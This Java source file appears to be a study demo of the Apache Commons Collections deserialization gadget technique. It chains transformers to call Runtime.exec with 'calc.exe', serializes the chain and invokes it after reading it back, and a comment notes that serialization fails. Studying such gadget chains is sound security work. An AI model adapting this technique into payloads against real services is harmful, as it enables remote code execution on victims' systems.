import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;

public class Demo3 {
    public static void main(String[] args) throws Exception{

        Transformer[] transformers = {
                new ConstantTransformer(Runtime.getRuntime()),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc.exe"})
        };
        ChainedTransformer chain = new ChainedTransformer(transformers);

        //序列化
        FileOutputStream file = new FileOutputStream("chenlvtang.bin");
        ObjectOutputStream se = new ObjectOutputStream(file);
        se.writeObject(chain);//反序列化失败
        se.close();
        //反序列化
        FileInputStream file1 = new FileInputStream("chenlvtang.bin");
        ObjectInputStream unse = new ObjectInputStream(file1);
        ChainedTransformer serverRead =  (ChainedTransformer) unse.readObject();
        unse.close();

        serverRead.transform("foobar");

    }
}
